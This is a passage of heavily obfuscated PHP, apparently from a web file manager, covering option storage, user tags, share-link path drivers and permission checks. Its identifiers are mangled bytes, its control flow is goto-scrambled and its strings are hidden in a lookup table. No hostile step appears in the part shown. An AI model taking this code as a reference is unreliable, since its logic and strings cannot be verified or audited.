$bÜ÷ï¤ß¤ğ =& $_SERVER[ì‹É]; $càôĞàéÈ = self::SQL_WHERE_IN_CHUNK; if (!is_array($aˆĞÔ—Ê‘) || !is_array($aˆĞÔ—Ê‘[$bÜ÷ï¤ß¤ğ[260]])) { return !1; } foreach ($aˆĞÔ—Ê‘[$bÜ÷ï¤ß¤ğ[260]] as $dÅµö¥Â‡¼ => $cÄí–Ÿ¡Ì) { if (is_array($cÄí–Ÿ¡Ì) && isset($cÄí–Ÿ¡Ì[0]) && is_string($cÄí–Ÿ¡Ì[0]) && strtolower($cÄí–Ÿ¡Ì[0]) == $bÜ÷ï¤ß¤ğ[7] && is_array($cÄí–Ÿ¡Ì[1]) && count($cÄí–Ÿ¡Ì[1]) > $càôĞàéÈ) { ignore_timeout(); return $dÅµö¥Â‡¼; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\x65\155\x4f\x70\x74\x69\157\156"; public $field = array(); public function listData($eÍÆÒ²Æö = false, $aŒõ‰ô ¾ = "\x6d\x6f\x64\x69\x66\171\124\x69\x6d\145", $EÒ…¾ùÊŒ = false) { $cä¨ºçÚõ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$eÍÆÒ²Æö) { $cä¨ºçÚõ = array_filter(array_values($cä¨ºçÚõ)); return array_sort_by($cä¨ºçÚõ, $aŒõ‰ô ¾, $EÒ…¾ùÊŒ); } return $cä¨ºçÚõ[$_SERVER[ì‹É][361] . $eÍÆÒ²Æö]; } public function insert($eŠË¶İ±Ì‹) { goto FÓå¿ÉâÓÜ; BŞ³¨…ƒ˜˜: return $e¯Ô«‡Ê±; goto d»œ¹øÄ©Ö; FÓå¿ÉâÓÜ: $eğƒ‚£«‡£ =& $_SERVER[ì‹É]; $eŠË¶İ±Ì‹ = array_field_key($eŠË¶İ±Ì‹, $this->field); $e¯Ô«‡Ê± = Model($this->modelType)->get($eğƒ‚£«‡£[362], $this->optionType . $eğƒ‚£«‡£[363]); goto C³õÌœ¥ñ¬; f¯öãÑŒˆö: $eŠË¶İ±Ì‹[$eğƒ‚£«‡£[108]] = time(); Model($this->modelType)->set($eğƒ‚£«‡£[362], $e¯Ô«‡Ê±, $this->optionType . $eğƒ‚£«‡£[363]); Model($this->modelType)->set($eğƒ‚£«‡£[361] . $e¯Ô«‡Ê±, $eŠË¶İ±Ì‹, $this->optionType); goto BŞ³¨…ƒ˜˜; C³õÌœ¥ñ¬: $e¯Ô«‡Ê± = $e¯Ô«‡Ê± ? $e¯Ô«‡Ê± : 0; $eŠË¶İ±Ì‹[$eğƒ‚£«‡£[364]] = ++$e¯Ô«‡Ê±; $eŠË¶İ±Ì‹[$eğƒ‚£«‡£[184]] = time(); goto f¯öãÑŒˆö; d»œ¹øÄ©Ö: } public function update($C®“º‰å», $dæ¬ëÍ ¢Â) { goto ağ®ù¼ÖÔ; B÷ˆÉğùÒò: return Model($this->modelType)->set($C†„¦ï·Îß[361] . $C®“º‰å», $dæ¬ëÍ ¢Â, $this->optionType); goto a™¬šÀ¿í; AÇĞ’Àè…: if (!$fé†ïŒ½‡) { return !1; } $dæ¬ëÍ ¢Â = array_merge($fé†ïŒ½‡, $dæ¬ëÍ ¢Â); $dæ¬ëÍ ¢Â[$C†„¦ï·Îß[108]] = time(); goto B÷ˆÉğùÒò; ağ®ù¼ÖÔ: $C†„¦ï·Îß =& $_SERVER[ì‹É]; $dæ¬ëÍ ¢Â = array_field_key($dæ¬ëÍ ¢Â, $this->field); $fé†ïŒ½‡ = $this->listData($C®“º‰å»); goto AÇĞ’Àè…; a™¬šÀ¿í: } public function remove($bå‰†øèê) { return Model($this->modelType)->remove($_SERVER[ì‹É][361] . $bå‰†øèê, $this->optionType); } public function clear() { $DáÃ®î…„ =& $_SERVER[ì‹É]; Model($this->modelType)->remove($DáÃ®î…„[362], $this->optionType . $DáÃ®î…„[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Bî¢ï•­»ô, $C¹ôöºù») { if (!$C¹ôöºù») { return !1; } $BºÎ²à¶ğÔ = $this->listData(); $BºÎ²à¶ğÔ = array_to_keyvalue($BºÎ²à¶ğÔ, $Bî¢ï•­»ô); return isset($BºÎ²à¶ğÔ[$C¹ôöºù»]) ? $BºÎ²à¶ğÔ[$C¹ôöºù»] : !1; } public function findByName($aó½™à»Ğ‡) { return $this->findByKey($_SERVER[ì‹É][28], $aó½™à»Ğ‡); } protected function resetData($Eê—ŸÊÀ‚æ) { $d˜àÌ›ôÀ =& $_SERVER[ì‹É]; $AÉ¨ÃõÁ†ƒ = array(); for ($bÒ«ôò³Şš = 0; $bÒ«ôò³Şš < count($Eê—ŸÊÀ‚æ); $bÒ«ôò³Şš++) { $AÉ¨ÃõÁ†ƒ[$d˜àÌ›ôÀ[361] . $Eê—ŸÊÀ‚æ[$bÒ«ôò³Şš][$d˜àÌ›ôÀ[364]]] = $Eê—ŸÊÀ‚æ[$bÒ«ôò³Şš]; } return Model($this->modelType)->set($AÉ¨ÃõÁ†ƒ, !1, $this->optionType); } private function getAutoName($F¤Ë„ ‹æ‹) { $d’ŒÊ¬£‡˜ = array_to_keyvalue($this->listData(), $_SERVER[ì‹É][28]); if (!$d’ŒÊ¬£‡˜ || !isset($d’ŒÊ¬£‡˜[$F¤Ë„ ‹æ‹])) { return $F¤Ë„ ‹æ‹; } for ($d‘†çç¶‚… = 1; $d‘†çç¶‚… < count($d’ŒÊ¬£‡˜); $d‘†çç¶‚…++) { $föºÙ­Ì‚‰ = $F¤Ë„ ‹æ‹ . "\50{$d‘†çç¶‚…}\x29"; if (!isset($d’ŒÊ¬£‡˜[$föºÙ­Ì‚‰])) { return $föºÙ­Ì‚‰; } } return $föºÙ­Ì‚‰; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($eßÁ¶‚Çë½ = false, $C©°òâƒŠ = '', $C è¼ñ“öƒ = false) { goto Eçò©òª¤; Eçò©òª¤: $BÃÑäº²¹ =& $_SERVER[ì‹É]; $E—š¹Òö›Ü = $this->cacheGet($C©°òâƒŠ); $A¿Óò§ÚÅø = $this->optionDefault($C©°òâƒŠ); goto DóïèÎ¥é; DóïèÎ¥é: $A¿Óò§ÚÅø = is_array($A¿Óò§ÚÅø) ? $A¿Óò§ÚÅø : array(); if (is_array($E—š¹Òö›Ü)) { $E—š¹Òö›Ü = array_merge($A¿Óò§ÚÅø, $E—š¹Òö›Ü); return $eßÁ¶‚Çë½ ? isset($E—š¹Òö›Ü[$eßÁ¶‚Çë½]) ? $E—š¹Òö›Ü[$eßÁ¶‚Çë½] : null : $E—š¹Òö›Ü; } $a‘İæÚöœ… = $this->filterWhere(array($BÃÑäº²¹[29] => $C©°òâƒŠ)); goto fÀµëàõå; d¾Ù»ÉŸˆ: $this->cacheSet($C©°òâƒŠ, $E—š¹Òö›Ü); $E—š¹Òö›Ü = array_merge($A¿Óò§ÚÅø, $E—š¹Òö›Ü); return $eßÁ¶‚Çë½ ? $E—š¹Òö›Ü[$eßÁ¶‚Çë½] : $E—š¹Òö›Ü; goto cëùí„ ; fÀµëàõå: $E—š¹Òö›Ü = $this->where($a‘İæÚöœ…)->select(); $E—š¹Òö›Ü = array_to_keyvalue($E—š¹Òö›Ü, $BÃÑäº²¹[90], $BÃÑäº²¹[354]); foreach ($E—š¹Òö›Ü as $AÊ±Ğ¾Å™ => $eîÓÁÊ‘) { if ($C è¼ñ“öƒ || in_array($AÊ±Ğ¾Å™, $this->jsonField)) { $E—š¹Òö›Ü[$AÊ±Ğ¾Å™] = json_decode($E—š¹Òö›Ü[$AÊ±Ğ¾Å™], !0); } } goto d¾Ù»ÉŸˆ; cëùí„ : } public function set($Aãæ—ë™Ï–, $BË½œ†™’ = false, $FàÉØ–óÕ = '') { $Cª¤÷†îŸµ =& $_SERVER[ì‹É]; $this->cacheRemove($FàÉØ–óÕ); $E©Èì—¬Ä = array(); $b÷Ùß‹Ô  = is_array($Aãæ—ë™Ï–) ? $Aãæ—ë™Ï– : array($Aãæ—ë™Ï– => $BË½œ†™’); foreach ($b÷Ùß‹Ô  as $EÖˆ’‹ó©« => $d‡¹õ«¢¸) { if (is_array($d‡¹õ«¢¸)) { $d‡¹õ«¢¸ = json_encode_force($d‡¹õ«¢¸); } $this->checkLength($d‡¹õ«¢¸, !1, $this->tableName . $Cª¤÷†îŸµ[4] . $Aãæ—ë™Ï–); $d‡¹õ«¢¸ = self::textEncode($d‡¹õ«¢¸); $b÷Ùß‹Ô  = array($Cª¤÷†îŸµ[29] => $FàÉØ–óÕ, $Cª¤÷†îŸµ[90] => $EÖˆ’‹ó©«, $Cª¤÷†îŸµ[354] => $d‡¹õ«¢¸); $E©Èì—¬Ä[] = $this->filterWhere($b÷Ùß‹Ô ); } return $this->addAll($E©Èì—¬Ä, array(), !0); } protected function optionDefault($Fãœ‘£›¶Ã = '') { return !1; } public function setDeep($e‘çäîÌî, $Fˆ¥Ÿ¥ò¾ = false, $F•ÚæÛÀÛí = '') { $d«Ê¸”™ = explode($_SERVER[ì‹É][94], $e‘çäîÌî); $BßæªâÚá = $this->get(); array_set_value($BßæªâÚá, $e‘çäîÌî, $Fˆ¥Ÿ¥ò¾); $this->set($d«Ê¸”™[0], $BßæªâÚá[$d«Ê¸”™[0]], $F•ÚæÛÀÛí); } public function remove($D ë½©ª„, $c±ÅÌßöØ¦ = '') { $AÓËø¬˜šÆ =& $_SERVER[ì‹É]; $this->CacheRemove($c±ÅÌßöØ¦); $eØ•š…³¦ô = $this->filterWhere(array($AÓËø¬˜šÆ[90] => $D ë½©ª„, $AÓËø¬˜šÆ[29] => $c±ÅÌßöØ¦)); if (is_null($D ë½©ª„)) { unset($eØ•š…³¦ô[$AÓËø¬˜šÆ[90]]); } return $this->where($eØ•š…³¦ô)->delete(); } public function cacheSet($C×Ñ‘Ëè®¥, $Añø†â’µ­ = false) { return Cache::set($this->cacheKey($C×Ñ‘Ëè®¥), $Añø†â’µ­); } public function cacheGet($fï­åğ‰®â) { return Cache::get($this->cacheKey($fï­åğ‰®â)); } public function cacheRemove($E¸œ§ªŸï) { return Cache::remove($this->cacheKey($E¸œ§ªŸï)); } protected function filterWhere($F‰øÅŠÅôÂ) { return $F‰øÅŠÅôÂ; } protected function cacheKey($e—ãÕÀ‘ùï) { return $e—ãÕÀ‘ùï; } } goto Eºô¼ŞçÀİ; Bğ²‘×Ñ†ë: class PathDriverDbShareLink extends PathDriverDB { public function __construct($dÓ»ßòî°İ) { $this->pathParse = $dÓ»ßòî°İ; $this->model = Model($_SERVER[ì‹É][1083]); } protected function infoParse($A×Ùè½åáÎ, $EÎĞÚÛŠ¼Ø = false, $b÷èìƒáÃÅ = false) { $Fš„à©ø—İ =& $_SERVER[ì‹É]; return Action($Fš„à©ø—İ[990])->sharePathInfo($this->pathParse[$Fš„à©ø—İ[76]], !0); } public function listPath($bÈ»¦ßµ˜á, $dãƒ×²ÕÃš = false) { $E“‚à„’ÛÑ =& $_SERVER[ì‹É]; $DšÚà‡ïÖŒ = parent::listPath($bÈ»¦ßµ˜á, $dãƒ×²ÕÃš); foreach ($DšÚà‡ïÖŒ as $Cá‰‰©ë½´ => $DòÕ“ÆÍÕß) { if (!in_array($Cá‰‰©ë½´, array($E“‚à„’ÛÑ[74], $E“‚à„’ÛÑ[75]))) { continue; } foreach ($DòÕ“ÆÍÕß as $fßøÅùñ => $b‚óè¤¢ˆÚ) { $DšÚà‡ïÖŒ[$Cá‰‰©ë½´][$fßøÅùñ] = Action($E“‚à„’ÛÑ[990])->shareItemInfo($b‚óè¤¢ˆÚ); } } return $DšÚà‡ïÖŒ; } public function listAll($C‹ì™¡¢òœ) { $Fµ—¢¸«Ò¼ =& $_SERVER[ì‹É]; $a¸îùŸÜÛ = IO::info($this->pathParse[$Fµ—¢¸«Ò¼[76]]); if (!$a¸îùŸÜÛ) { return array(); } $eËÖ¹±†Øø = $this->model->listAll($C‹ì™¡¢òœ); foreach ($eËÖ¹±†Øø as &$b×…¡™ë™) { $b×…¡™ë™[$Fµ—¢¸«Ò¼[388]] = Action($Fµ—¢¸«Ò¼[990])->shareItemInfo($b×…¡™ë™[$Fµ—¢¸«Ò¼[388]]); } return $eËÖ¹±†Øø; } } class PathDriverDriverShareItem { public function __construct($c°’Éš¸å) { $this->pathParse = $c°’Éš¸å; } public function __call($F†¸‚–åÜ, $a‘¿“’„š) { $Fá‡é“Œå =& $_SERVER[ì‹É]; if (method_exists($this, $F†¸‚–åÜ)) { return; } $DÛ¬»££´„ = call_user_func_array(array($Fá‡é“Œå[1090], $F†¸‚–åÜ), $a‘¿“’„š); $eÖ‡°Û÷•¨ = array($Fá‡é“Œå[1091], $Fá‡é“Œå[1092], $Fá‡é“Œå[1093], $Fá‡é“Œå[1094], $Fá‡é“Œå[482], $Fá‡é“Œå[484], $Fá‡é“Œå[1095], $Fá‡é“Œå[92], $Fá‡é“Œå[1096], $Fá‡é“Œå[1097]); if (in_array($F†¸‚–åÜ, $eÖ‡°Û÷•¨)) { $DÛ¬»££´„ = $this->getPathOuter($DÛ¬»££´„); } return $DÛ¬»££´„; } public function copy($D´»À«è°, $c‹Î®ÌÅÅ´, $Fƒ²í¯»­« = false) { return $this->copyMove($D´»À«è°, $c‹Î®ÌÅÅ´, $Fƒ²í¯»­«, $_SERVER[ì‹É][482]); } public function move($BÔ·Šõ®, $f•¤ãˆñÏ, $e¿×åßÒÚô = false) { return $this->copyMove($BÔ·Šõ®, $f•¤ãˆñÏ, $e¿×åßÒÚô, $_SERVER[ì‹É][484]); } private function copyMove($b¹‰«ã÷”, $A¥ìˆŒÏØŞ, $aéòŒÆá¯, $d–ëÛàÌ¤) { goto A¬ÕÈÎ‹÷«; A¬ÕÈÎ‹÷«: $B‡õÈëš¼Ì =& $_SERVER[ì‹É]; $Bã³•Òå‚ = $A¥ìˆŒÏØŞ; $A¥ù‡«‚¥Ö = IO::driverMake($A¥ìˆŒÏØŞ); goto b‰ŒºòåÚá; cÅ¬ãƒÆëœ: return $D‡•‡ƒ‹×; goto A­‡êÀİ¦; b‰ŒºòåÚá: if ($A¥ù‡«‚¥Ö->pathParse[$B‡õÈëš¼Ì[971]]) { $A¥ìˆŒÏØŞ = $A¥ù‡«‚¥Ö->pathParse[$B‡õÈëš¼Ì[971]]; } else { $A¥ìˆŒÏØŞ = $Bã³•Òå‚; } $D‡•‡ƒ‹× = IO::copyMove($b¹‰«ã÷”, $A¥ìˆŒÏØŞ, $aéòŒÆá¯, $d–ëÛàÌ¤); $D‡•‡ƒ‹× = $this->getPathOuter($D‡•‡ƒ‹×); goto cÅ¬ãƒÆëœ; A­‡êÀİ¦: } public function pathFather($FŞ¬ÔÛ«¥–) { return get_path_father($this->pathParse[$_SERVER[ì‹É][76]]); } public function iconvSystem($cĞôô³Ã–Ÿ) { return $cĞôô³Ã–Ÿ; } protected function infoParse($c½¬øëÃ) { $bÀÔïõèÕÜ =& $_SERVER[ì‹É]; $e—–¯§† = $this->pathParse[$bÀÔïõèÕÜ[435]][$bÀÔïõèÕÜ[991]] . $this->pathParse[$bÀÔïõèÕÜ[984]]; $cÏ½»”½ó¾ = IO::info($e—–¯§†); $Fà×Ø«äŞÑ = $this->pathParse[$bÀÔïõèÕÜ[435]]; return Action($bÀÔïõèÕÜ[1089])->_shareItemeParse($cÏ½»”½ó¾, $Fà×Ø«äŞÑ); } public function listAll($AôÇÃ¨³) { $C‡Îá‰½˜ =& $_SERVER[ì‹É]; $E»ß¥µâæº = IO::listAll($AôÇÃ¨³); $f©™Í†™¶ï = $this->pathParse[$C‡Îá‰½˜[435]]; foreach ($E»ß¥µâæº as &$f«³ÂõçÏ) { check_abort(); $f«³ÂõçÏ = array_merge(IO::info($f«³ÂõçÏ[$C‡Îá‰½˜[76]]), $f«³ÂõçÏ); $f«³ÂõçÏ[$C‡Îá‰½˜[388]] = Action($C‡Îá‰½˜[1089])->_shareItemeParse($f«³ÂõçÏ, $f©™Í†™¶ï); } return $E»ß¥µâæº; } public function getPathOuter($eº­ã·¤Œœ) { goto AÂ¡®ŞğË©; AÂ¡®ŞğË©: $b¡·ÍâÃĞˆ =& $_SERVER[ì‹É]; $F­´…÷”Âå = KodIO::parse($eº­ã·¤Œœ); if ($F­´…÷”Âå[$b¡·ÍâÃĞˆ[29]] == KodIO::KOD_SHARE_ITEM) { return $F­´…÷”Âå[$b¡·ÍâÃĞˆ[76]]; } goto Dœ±Ô¼å”Û; Dœ±Ô¼å”Û: $f÷ø©à³å÷ = KodIO::clear($eº­ã·¤Œœ); $aØÖ®õÑ†‚ = KodIO::clear($this->pathParse[$b¡·ÍâÃĞˆ[435]][$b¡·ÍâÃĞˆ[991]]); $A¦Š§Îçß° = substr($f÷ø©à³å÷, strlen($aØÖ®õÑ†‚)); goto cÆî¾¶Á÷™; cÆî¾¶Á÷™: if (substr($f÷ø©à³å÷, 0, strlen($aØÖ®õÑ†‚)) != $aØÖ®õÑ†‚) { return !1; } return $this->pathParse[$b¡·ÍâÃĞˆ[985]] . $b¡·ÍâÃĞˆ[8] . ltrim($A¦Š§Îçß°, $b¡·ÍâÃĞˆ[8]); goto bŸí„—“ˆ„; bŸí„—“ˆ„: } public function getType() { $a”Í‰Çƒã =& $_SERVER[ì‹É]; $F…ôÎáµ’ = str_replace($a”Í‰Çƒã[72], $a”Í‰Çƒã[33], get_class($this)); return strtolower($F…ôÎáµ’); } public function isTypeObject($cà¢«Ó—¿®) { return IO::isTypeObject($cà¢«Ó—¿®); } public function info($dÀÑóæåâ¬) { return $this->infoParse($dÀÑóæåâ¬); } public function infoAuth($cÒ¢Éä•Š®) { return $this->infoParse($cÒ¢Éä•Š®); } public function infoWithChildren($dØÍ‡ÑÖÉç) { return $this->infoParse($dØÍ‡ÑÖÉç); } public function infoFull($FÁš·Š À) { return $this->infoParse($FÁš·Š À); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($cÃ¾¥Ùš­) { $this->pathParse = $cÃ¾¥Ùš­; } protected function infoParse($F’”öºéÜ¢) { $d’â¼¼¢£” =& $_SERVER[ì‹É]; return Action($d’â¼¼¢£”[990])->sharePathInfo($this->pathParse[$d’â¼¼¢£”[76]], !0); } public function listPath($aÜÇÕØšæ, $F™Éãæˆ = false) { $Dõ‘‡©ëğá =& $_SERVER[ì‹É]; $f±ßõãõ = IO::listPath($aÜÇÕØšæ, $F™Éãæˆ); foreach ($f±ßõãõ as $A«³Ø•«‚ => $dÍ£ˆÕïö…) { if (!in_array($A«³Ø•«‚, array($Dõ‘‡©ëğá[74], $Dõ‘‡©ëğá[75]))) { continue; } foreach ($dÍ£ˆÕïö… as $C¡èœƒª™é => $a½œÎÙæ†Ğ) { $f±ßõãõ[$A«³Ø•«‚][$C¡èœƒª™é] = Action($Dõ‘‡©ëğá[990])->shareItemInfo($a½œÎÙæ†Ğ); } } return $f±ßõãõ; } public function listAll($Dù¤œ®Œîè) { $C¹òÀ„Š„» =& $_SERVER[ì‹É]; $B¦ñé®İğì = IO::listAll($Dù¤œ®Œîè); foreach ($B¦ñé®İğì as &$bñ»áä÷É) { $bñ»áä÷É = array_merge(IO::info($bñ»áä÷É[$C¹òÀ„Š„»[76]]), $bñ»áä÷É); $bñ»áä÷É[$C¹òÀ„Š„»[388]] = Action($C¹òÀ„Š„»[990])->shareItemInfo($bñ»áä÷É); } return $B¦ñé®İğì; } } goto eôø§ë™Ù´; dõâ¦§ö¤ß: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\137\157\x70\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($Eœ»Ø©ëâ) { return "\x55\163\145\x72\117\160\x74\x69\157\156\x5f{$Eœ»Ø©ëâ}\137" . USER_ID; } protected function filterWhere($c¡â«Èğ) { $c¡â«Èğ[$_SERVER[ì‹É][1351]] = USER_ID; return $c¡â«Èğ; } public function cacheRemoveUser($fË«´ŞÓÚé, $a–ˆ¿äÑŒ) { return Cache::remove("\x55\163\145\162\117\160\164\x69\x6f\x6e\x5f{$fË«´ŞÓÚé}\x5f" . $a–ˆ¿äÑŒ); } protected function optionDefault($E‚‹ŞËÒ«Ò = '') { $Aõ¹Ü–ˆ×ò =& $_SERVER[ì‹É]; if ($E‚‹ŞËÒ«Ò == $Aõ¹Ü–ˆ×ò[33]) { return $GLOBALS[$Aõ¹Ü–ˆ×ò[6]][$Aõ¹Ü–ˆ×ò[2423]]; } if ($E‚‹ŞËÒ«Ò == $Aõ¹Ü–ˆ×ò[2424]) { return $GLOBALS[$Aõ¹Ü–ˆ×ò[6]][$Aõ¹Ü–ˆ×ò[2425]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\164\x61\x67\114\151\x73\164"; public $modelType = "\x55\x73\145\162\117\160\x74\151\x6f\x6e"; public $field = array("\156\141\155\145", "\163\164\171\154\x65", "\163\x6f\162\164"); public function listData($A‚‚ïíÊÃ = false, $c–¥ÆÃÊ’ = "\163\157\162\x74", $FÎÓÆ°ñ ™ = false) { return parent::listData($A‚‚ïíÊÃ, $c–¥ÆÃÊ’, $FÎÓÆ°ñ ™); } public function remove($FíŸ¿Œš) { return parent::remove($FíŸ¿Œš); } public function add($dÔ®’º­ì, $c¯§ô ©¦‚ = "\154\141\142\x65\154\x2d\147\162\x65\171\55\156\157\x72\155\141\x6c") { $EŠ¨®¸Â‚Æ =& $_SERVER[ì‹É]; if ($this->findByName($dÔ®’º­ì)) { return !1; } $dËŞºœâ‡ï = array($EŠ¨®¸Â‚Æ[383] => $dÔ®’º­ì, $EŠ¨®¸Â‚Æ[433] => $c¯§ô ©¦‚, $EŠ¨®¸Â‚Æ[2018] => $this->getSort($EŠ¨®¸Â‚Æ[243]) + 1); return parent::insert($dËŞºœâ‡ï); } public function update($b†¯”éõÜ, $CÔ±ôäÙÌˆ) { $b¸Æ‘¥ô®· =& $_SERVER[ì‹É]; $fº´×™äà = $this->listData($b†¯”éõÜ); $b‡ÉŸ„à– = $this->findByName($CÔ±ôäÙÌˆ[$b¸Æ‘¥ô®·[28]]); if (!$fº´×™äà || $b‡ÉŸ„à– && $b‡ÉŸ„à–[$b¸Æ‘¥ô®·[364]] != $fº´×™äà[$b¸Æ‘¥ô®·[364]]) { return !1; } return parent::update($b†¯”éõÜ, $CÔ±ôäÙÌˆ); } public function moveTop($AŒ¬Í›Ğ§à) { $Bª“‡ß¹ê =& $_SERVER[ì‹É]; $dÖÜ¬‘§Òä = parent::listData(); $A¤Ş§¬Ùµë = $this->getSort($Bª“‡ß¹ê[242]); foreach ($dÖÜ¬‘§Òä as &$D†‚Ñ›ºøì) { if ($D†‚Ñ›ºøì[$Bª“‡ß¹ê[364]] == $AŒ¬Í›Ğ§à) { $D†‚Ñ›ºøì[$Bª“‡ß¹ê[2035]] = $A¤Ş§¬Ùµë; continue; } $D†‚Ñ›ºøì[$Bª“‡ß¹ê[2035]] += 1; } return parent::resetData($dÖÜ¬‘§Òä); } public function moveBottom($EÍçµà“è±) { $bÏ æ¥Óµ =& $_SERVER[ì‹É]; $bªôÄ”³ = $this->getSort($bÏ æ¥Óµ[243]) + 1; return parent::update($EÍçµà“è±, array($bÏ æ¥Óµ[2035] => $bªôÄ”³)); } public function resetSort($E’•ƒÒ…Œ) { $aÕÔÚ Úæ÷ =& $_SERVER[ì‹É]; $B½ÑÊÁ¢Ü„ = array(); for ($a‰Ë ¦ÏŞ = 0; $a‰Ë ¦ÏŞ < count($E’•ƒÒ…Œ); $a‰Ë ¦ÏŞ++) { $B½ÑÊÁ¢Ü„[$E’•ƒÒ…Œ[$a‰Ë ¦ÏŞ] . $aÕÔÚ Úæ÷[33]] = $a‰Ë ¦ÏŞ + 1; } $B¡ÂˆòÄÀÍ = parent::listData(); foreach ($B¡ÂˆòÄÀÍ as &$fù»™Î†ÑŒ) { $fÅ‡“õÀÎŒ = $B½ÑÊÁ¢Ü„[$fù»™Î†ÑŒ[$aÕÔÚ Úæ÷[364]]]; $fù»™Î†ÑŒ[$aÕÔÚ Úæ÷[2035]] = $fÅ‡“õÀÎŒ ? $fÅ‡“õÀÎŒ : $fù»™Î†ÑŒ[$aÕÔÚ Úæ÷[2035]]; } return parent::resetData($B¡ÂˆòÄÀÍ); } private function getSort($e¡ÕÌÌÃ•) { $fÆ­ƒ® ãŸ =& $_SERVER[ì‹É]; $bÌ…ò¸Ï‚Õ = parent::listData(); $b°Š›ÊÕ¯‰ = array_to_keyvalue($bÌ…ò¸Ï‚Õ, $fÆ­ƒ® ãŸ[33], $fÆ­ƒ® ãŸ[2035]); if (!$b°Š›ÊÕ¯‰) { $b°Š›ÊÕ¯‰ = array(0); } $e³ŠÊ—ÜÜ‹ = $e¡ÕÌÌÃ• == $fÆ­ƒ® ãŸ[243] ? max($b°Š›ÊÕ¯‰) : min($b°Š›ÊÕ¯‰); return intval($e³ŠÊ—ÜÜ‹); } } goto CºÇ‚Â‚ç‡; F‰ºàÕ¥Óí: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $Aô˜¨§×æ¬ =& $_SERVER[ì‹É]; $eÄÌ†Á“öà = array(array($Aô˜¨§×æ¬[383] => LNG($Aô˜¨§×æ¬[2015]), $Aô˜¨§×æ¬[2016] => $Aô˜¨§×æ¬[2017], $Aô˜¨§×æ¬[2018] => 6, $Aô˜¨§×æ¬[2019] => 1, $Aô˜¨§×æ¬[2020] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Aô˜¨§×æ¬[383] => LNG($Aô˜¨§×æ¬[2021]), $Aô˜¨§×æ¬[2016] => $Aô˜¨§×æ¬[2022], $Aô˜¨§×æ¬[2018] => 1, $Aô˜¨§×æ¬[2019] => 1, $Aô˜¨§×æ¬[2020] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aô˜¨§×æ¬[383] => LNG($Aô˜¨§×æ¬[2023]), $Aô˜¨§×æ¬[2016] => $Aô˜¨§×æ¬[2024], $Aô˜¨§×æ¬[2018] => 2, $Aô˜¨§×æ¬[2019] => 1, $Aô˜¨§×æ¬[2020] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aô˜¨§×æ¬[383] => LNG($Aô˜¨§×æ¬[2025]), $Aô˜¨§×æ¬[2016] => $Aô˜¨§×æ¬[2024], $Aô˜¨§×æ¬[2018] => 3, $Aô˜¨§×æ¬[2019] => 1, $Aô˜¨§×æ¬[2020] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Aô˜¨§×æ¬[383] => LNG($Aô˜¨§×æ¬[2026]), $Aô˜¨§×æ¬[2016] => $Aô˜¨§×æ¬[2027], $Aô˜¨§×æ¬[2018] => 4, $Aô˜¨§×æ¬[2019] => 1, $Aô˜¨§×æ¬[2020] => self::AUTH_SHOW | self::AUTH_VIEW), array($Aô˜¨§×æ¬[383] => LNG($Aô˜¨§×æ¬[2028]), $Aô˜¨§×æ¬[2016] => $Aô˜¨§×æ¬[2029], $Aô˜¨§×æ¬[2018] => 5, $Aô˜¨§×æ¬[2019] => 1, $Aô˜¨§×æ¬[2020] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Aô˜¨§×æ¬[383] => LNG($Aô˜¨§×æ¬[2030]), $Aô˜¨§×æ¬[2016] => $Aô˜¨§×æ¬[2031], $Aô˜¨§×æ¬[2018] => 7, $Aô˜¨§×æ¬[2019] => 1, $Aô˜¨§×æ¬[2020] => 0)); return $eÄÌ†Á“öà; } public static function authCheck($E×Ô³¿¢Ï, $E•È’íÖßÒ) { $E×Ô³¿¢Ï = intval($E×Ô³¿¢Ï); if ($GLOBALS[$_SERVER[ì‹É][453]]) { return !0; } if ($E×Ô³¿¢Ï <= 0) { return !1; } if (($E×Ô³¿¢Ï & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($E×Ô³¿¢Ï & $E•È’íÖßÒ); } public static function authCheckShow($F†çÔÂÊ­†) { return self::authCheck($F†çÔÂÊ­†, self::AUTH_SHOW); } public static function authCheckView($dñŒÙÚÆÇâ) { return self::authCheck($dñŒÙÚÆÇâ, self::AUTH_VIEW); } public static function authCheckDownload($Dô‘“ˆ©‘Ÿ) { return self::authCheck($Dô‘“ˆ©‘Ÿ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($FÍäÁ¤Ñ‚) { return self::authCheck($FÍäÁ¤Ñ‚, self::AUTH_UPLOAD); } public static function authCheckEdit($eŞÎ„²Ëª) { return self::authCheck($eŞÎ„²Ëª, self::AUTH_EDIT); } public static function authCheckRemove($e•Â¸ïª¿ö) { return self::authCheck($e•Â¸ïª¿ö, self::AUTH_REMOVE); } public static function authCheckShare($Dîœ«Ÿª¿Ş) { return self::authCheck($Dîœ«Ÿª¿Ş, self::AUTH_SHARE); } public static function 